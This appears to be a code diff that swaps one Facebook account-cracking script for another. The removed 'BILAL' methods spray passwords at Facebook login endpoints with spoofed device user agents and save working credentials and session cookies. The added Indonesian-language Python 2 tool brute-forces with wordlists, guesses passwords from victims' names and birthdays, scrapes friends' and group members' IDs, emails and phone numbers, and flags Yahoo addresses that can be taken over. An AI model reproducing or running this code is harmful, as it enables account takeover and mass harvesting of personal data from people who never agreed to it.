+        idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
+        passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m: \x1b[1;97m')
         try:
-                for pas in passlist:
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=3130};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data = {
-                                'adid':adid,
-                                'format':'json',
-                                'device_id':device_id,
-                                'email':ids,
-                                'password':pas,
-                                'generate_analytics_claims':'1',
-                                'credentials_type':'password',
-                                'source':'login',
-                                'error_detail_type':'button_with_disabled',
-                                'enroll_misauth':'false',
-                                'generate_session_cookies':'1',
-                                'generate_machine_id':'1',
-                                'fb_api_req_friendly_name':'authenticate',
-                        }
-                        headers={
-                                'Authorization':f'OAuth {accessToken}',
-                                'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-Connection-Type':'unknown',
-                                'User-Agent':ua,
-                                'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
-                                }
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                try:
-                                        uid = po['uid']
-                                except:
-                                        uid = ids
-                                if str(uid) in oks:
-                                        break
-                                else:
-                                        print('\r\r\033[1;32m [BILAL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        print("Cookie: "+coki)
-                                        open('/sdcard/BILAL-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/BILAL-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        oks.append(str(uid))
-                                        break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                try:
-                                        uid = po['error']['error_data']['uid']
-                                except:
-                                        uid = ids
-                                if uid in oks:pass
-                                else:
-                                        print('\r\r\x1b[38;5;205m [BILAL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BILAL-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        cps.append(str(ids))
-                                        break
-                        else:continue
-                loop+=1
-        except Exception as e:
-                pass
-#method5
-def trt5(ids,passlist):
-        global loop
-        global oks
-        sys.stdout.write('\r\r\033[1;37m [BILAL-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+            file = open(idlist, 'r')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+            for x in range(40):
+                zedd = threading.Thread(target=scrak, args=())
+                zedd.start()
+                threads.append(zedd)
+
+            for zedd in threads:
+                zedd.join()
+
+        except IOError:
+            print '\x1b[1;91m[!] File tidak ditemukan'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            menu_hack()
+
+
+def scrak():
+    global back
+    global berhasil
+    global cekpoint
+    global gagal
+    global up
+    try:
+        buka = open(idlist, 'r')
+        up = buka.read().split()
+        while file:
+            username = file.readline().strip()
+            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
+            data = urllib.urlopen(url)
+            mpsh = json.load(data)
+            if back == len(up):
+                break
+            if 'access_token' in mpsh:
+                bisa = open('Berhasil.txt', 'w')
+                bisa.write(username + ' | ' + passw + '\n')
+                bisa.close()
+                berhasil.append('\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + username + ' | ' + passw)
+                back += 1
+            else:
+                if 'www.facebook.com' in mpsh['error_msg']:
+                    cek = open('Cekpoint.txt', 'w')
+                    cek.write(username + ' | ' + passw + '\n')
+                    cek.close()
+                    cekpoint.append('\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + username + ' | ' + passw)
+                    back += 1
+                else:
+                    gagal.append(username)
+                    back += 1
+            sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack    \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive\x1b[1;91m:\x1b[1;96m' + str(len(berhasil)) + ' \x1b[1;97m=>\x1b[1;93mCheck\x1b[1;91m:\x1b[1;96m' + str(len(cekpoint)))
+            sys.stdout.flush()
+
+    except IOError:
+        print '\n\x1b[1;91m[!] Koneksi terganggu'
+        time.sleep(1)
+    except requests.exceptions.ConnectionError:
+        print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+
+
+def hasil():
+    print
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    for b in berhasil:
+        print b
+
+    for c in cekpoint:
+        print c
+
+    print
+    print '\x1b[31m[x] Gagal \x1b[1;97m--> ' + str(len(gagal))
+    keluar()
+
+
+def super():
+    global toket
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    print '\x1b[1;37;40m1. Crack dari daftar Teman'
+    print '\x1b[1;37;40m2. Crack dari member Grup'
+    print '\x1b[1;31;40m0. Kembali'
+    print
+    pilih_super()
+
+
+def pilih_super():
+    peak = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
+    if peak == '':
+        print '\x1b[1;91m[!] Jangan kosong'
+        pilih_super()
+    else:
+        if peak == '1':
+            os.system('clear')
+            print logo
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil id teman \x1b[1;97m...')
+            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+            z = json.loads(r.text)
+            for s in z['data']:
+                id.append(s['id'])
+
+        else:
+            if peak == '2':
+                os.system('clear')
+                print logo
+                print 40 * '\x1b[1;97m\xe2\x95\x90'
+                idg = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup   \x1b[1;91m:\x1b[1;97m ')
+                try:
+                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
+                    asw = json.loads(r.text)
+                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
+                except KeyError:
+                    print '\x1b[1;91m[!] Grup tidak ditemukan'
+                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                    super()
+
+                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
+                s = json.loads(re.text)
+                for i in s['data']:
+                    id.append(i['id'])
+
+            else:
+                if peak == '0':
+                    menu_hack()
+                else:
+                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
+                    pilih_super()
+    print '\x1b[1;91m[+] \x1b[1;92mJumlah ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+    titik = ['.   ', '..  ', '... ']
+    for o in titik:
+        print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
+        sys.stdout.flush()
+        time.sleep(1)
+
+    print
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+
+    def main(arg):
+        user = arg
         try:
-                for pas in passlist:
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2246};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data = {
-                                'adid':adid,
-                                'format':'json',
-                                'device_id':device_id,
-                                'email':ids,
-                                'password':pas,
-                                'generate_analytics_claims':'1',
-                                'credentials_type':'password',
-                                'source':'login',
-                                'error_detail_type':'button_with_disabled',
-                                'enroll_misauth':'false',
-                                'generate_session_cookies':'1',
-                                'generate_machine_id':'1',
-                                'fb_api_req_friendly_name':'authenticate',
-                        }
-                        headers={
-                                'Authorization':f'OAuth {accessToken}',
-                                'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-Connection-Type':'unknown',
-                                'User-Agent':ua,
-                                'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
-                                }
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                try:
-                                        uid = po['uid']
-                                except:
-                                        uid = ids
-                                if str(uid) in oks:
-                                        break
+            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
+            b = json.loads(a.text)
+            pass1 = b['first_name'] + '123'
+            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass1
+            else:
+                if 'www.facebook.com' in q['error_msg']:
+                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1
+                else:
+                    pass2 = b['first_name'] + '12345'
+                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass2
+                    else:
+                        if 'www.facebook.com' in q['error_msg']:
+                            print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2
+                        else:
+                            pass3 = b['last_name'] + '123'
+                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                            q = json.load(data)
+                            if 'access_token' in q:
+                                print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass3
+                            else:
+                                if 'www.facebook.com' in q['error_msg']:
+                                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass3
                                 else:
-                                        print('\r\r\033[1;32m [BILAL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BILAL-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        oks.append(str(uid))
-                                        break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                try:
-                                        uid = po['error']['error_data']['uid']
-                                except:
-                                        uid = ids
-                                if uid in oks:pass
+                                    lahir = b['birthday']
+                                    pass4 = lahir.replace('/', '')
+                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                    q = json.load(data)
+                                    if 'access_token' in q:
+                                        print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass4
+                                    else:
+                                        if 'www.facebook.com' in q['error_msg']:
+                                            print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+    super()
+
+
+def brute():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
+        try:
+            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail\x1b[1;97m/\x1b[1;92mHp \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
+            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
+            total = open(passw, 'r')
+            total = total.readlines()
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
+            print '\x1b[1;91m[+] \x1b[1;92mJumlah\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+            sandi = open(passw, 'r')
+            for pw in sandi:
+                try:
+                    pw = pw.replace('\n', '')
+                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mMencoba \x1b[1;97m' + pw)
+                    sys.stdout.flush()
+                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    mpsh = json.loads(data.text)
+                    if 'access_token' in mpsh:
+                        dapat = open('Brute.txt', 'w')
+                        dapat.write(email + ' | ' + pw + '\n')
+                        dapat.close()
+                        print '\n\x1b[1;91m[+] \x1b[1;92mDitemukan.'
+                        print 40 * '\x1b[1;97m\xe2\x95\x90'
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
+                        keluar()
+                    else:
+                        if 'www.facebook.com' in mpsh['error_msg']:
+                            ceks = open('Brutecekpoint.txt', 'w')
+                            ceks.write(email + ' | ' + pw + '\n')
+                            ceks.close()
+                            print '\n\x1b[1;91m[+] \x1b[1;92mDitemukan.'
+                            print 40 * '\x1b[1;97m\xe2\x95\x90'
+                            print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
+                            keluar()
+                except requests.exceptions.ConnectionError:
+                    print '\x1b[1;91m[!] Koneksi Error'
+                    time.sleep(1)
+
+        except IOError:
+            print '\x1b[1;91m[!] File tidak ditemukan...'
+            print '\n\x1b[1;91m[!] \x1b[1;92mSepertinya kamu tidak memiliki wordlist'
+            tanyaw()
+
+
+def tanyaw():
+    why = raw_input('\x1b[1;91m[?] \x1b[1;92mIngin membuat wordlist ? \x1b[1;92m[y/t]\x1b[1;91m:\x1b[1;97m ')
+    if why == '':
+        print '\x1b[1;91m[!] Tolong pilih \x1b[1;97m(y/t)'
+        tanyaw()
+    else:
+        if why == 'y':
+            wordlist()
+        else:
+            if why == 'Y':
+                wordlist()
+            else:
+                if why == 't':
+                    menu_hack()
+                else:
+                    if why == 'T':
+                        menu_hack()
+                    else:
+                        print '\x1b[1;91m[!] Tolong pilih \x1b[1;97m(y/t)'
+                        tanyaw()
+
+
+def menu_yahoo():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    print '\x1b[1;37;40m1. Dari teman facebook'
+    print '\x1b[1;37;40m2. Gunakan File'
+    print '\x1b[1;31;40m0. Kembali'
+    print
+    yahoo_pilih()
+
+
+def yahoo_pilih():
+    go = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
+    if go == '':
+        print '\x1b[1;91m[!] Jangan kosong'
+        yahoo_pilih()
+    else:
+        if go == '1':
+            yahoofriends()
+        else:
+            if go == '2':
+                yahoolist()
+            else:
+                if go == '0':
+                    menu_hack()
+                else:
+                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + go + ' \x1b[1;91mTidak ada'
+                    yahoo_pilih()
+
+
+def yahoofriends():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    mpsh = []
+    jml = 0
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+    kimak = json.loads(teman.text)
+    save = open('MailVuln.txt', 'w')
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    for w in kimak['data']:
+        jml += 1
+        mpsh.append(jml)
+        id = w['id']
+        nama = w['name']
+        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
+        z = json.loads(links.text)
+        try:
+            mail = z['email']
+            yahoo = re.compile('@.*')
+            otw = yahoo.search(mail).group()
+            if 'yahoo.com' in otw:
+                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
+                br._factory.is_html = True
+                br.select_form(nr=0)
+                br['username'] = mail
+                klik = br.submit().read()
+                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
+                try:
+                    pek = jok.search(klik).group()
+                except:
+                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
+                    continue
+
+                if '"messages.ERROR_INVALID_USERNAME">' in pek:
+                    save.write(mail + '\n')
+                    print 40 * '\x1b[1;97m\xe2\x95\x90'
+                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + nama
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + id
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;97m ' + mail + ' [\x1b[1;92m' + vuln + '\x1b[1;97m]'
+                    print 40 * '\x1b[1;97m\xe2\x95\x90'
+                else:
+                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
+        except KeyError:
+            pass
+
+    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
+    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
+    save.close()
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+    menu_yahoo()
+
+
+def yahoolist():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
+        files = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m: \x1b[1;97m')
+        try:
+            total = open(files, 'r')
+            mail = total.readlines()
+        except IOError:
+            print '\x1b[1;91m[!] File tidak ada'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            menu_yahoo()
+
+    mpsh = []
+    jml = 0
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+    save = open('MailVuln.txt', 'w')
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    print '\x1b[1;91m[?] \x1b[1;97mStatus \x1b[1;91m:  \x1b[1;97mRed[\x1b[1;92m' + vulnot + '\x1b[1;97m]  Green[\x1b[1;92m' + vuln + '\x1b[1;97m]'
+    print
+    mail = open(files, 'r').readlines()
+    for pw in mail:
+        mail = pw.replace('\n', '')
+        jml += 1
+        mpsh.append(jml)
+        yahoo = re.compile('@.*')
+        otw = yahoo.search(mail).group()
+        if 'yahoo.com' in otw:
+            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
+            br._factory.is_html = True
+            br.select_form(nr=0)
+            br['username'] = mail
+            klik = br.submit().read()
+            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
+            try:
+                pek = jok.search(klik).group()
+            except:
+                print '\x1b[1;91m ' + mail
+                continue
+
+            if '"messages.ERROR_INVALID_USERNAME">' in pek:
+                save.write(mail + '\n')
+                print '\x1b[1;92m ' + mail
+            else:
+                print '\x1b[1;91m ' + mail
+
+    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
+    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
+    save.close()
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+    menu_yahoo()
+
+
+def grab():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    print '\x1b[1;37;40m1. Ambil ID teman'
+    print '\x1b[1;37;40m2. Ambil ID teman dari teman'
+    print '\x1b[1;37;40m3. Ambil ID member GRUP'
+    print '\x1b[1;37;40m4. Ambil Email teman'
+    print '\x1b[1;37;40m5. Ambil Email teman dari teman'
+    print '\x1b[1;37;40m6. Ambil No HP teman'
+    print '\x1b[1;37;40m7. Ambil No HP teman dari teman'
+    print '\x1b[1;31;40m0. Kembali'
+    print
+    grab_pilih()
+
+
+def grab_pilih():
+    cuih = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
+    if cuih == '':
+        print '\x1b[1;91m[!] Jangan kosong'
+        grab_pilih()
+    else:
+        if cuih == '1':
+            id_teman()
+        else:
+            if cuih == '2':
+                idfrom_teman()
+            else:
+                if cuih == '3':
+                    id_member_grup()
+                else:
+                    if cuih == '4':
+                        email()
+                    else:
+                        if cuih == '5':
+                            emailfrom_teman()
+                        else:
+                            if cuih == '6':
+                                nomor_hp()
+                            else:
+                                if cuih == '7':
+                                    hpfrom_teman()
                                 else:
-                                        print('\r\r\x1b[38;5;205m [BILAL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BILAL-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        cps.append(str(ids))
-                                        break
-                        else:continue
-                loop+=1
-        except Exception as e:
-                pass
-#method6
-def trt6(ids,passlist):
-	global loop
-	global oks
-	try:
-		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;37m [BILAL-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-			session = requests.Session()
-			ua = random.choice(ugen)
-			free_fb = session.get('https://free.facebook.com').text
-			log_data = {
-				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-			"try_number":"0",
-			"unrecognized_tries":"0",
-			"email":uid,
-			"pass":ps,
-			"login":"Log In"}
-			header_freefb = {'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
-    'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.76", "Not(A:Brand";v="8.0.0.0"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
-    'viewport-width': '980',}
-			lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
-			log_cookies=session.cookies.get_dict().keys()
-			if 'c_user' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				uid = coki[151:166]
